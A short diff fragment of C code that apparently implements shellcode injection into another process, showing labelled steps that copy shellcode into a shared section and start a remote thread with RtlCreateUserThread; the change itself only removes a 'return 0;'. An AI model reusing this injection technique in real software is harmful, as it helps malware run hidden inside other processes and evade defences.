@@ -16,5 +16,3 @@ STEP #4 copy shellcode to the local view, which will get reflected in the target
 	
 STEP #5 HANDLE targetThreadHandle = NULL;
 	fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);
-
-	return 0;
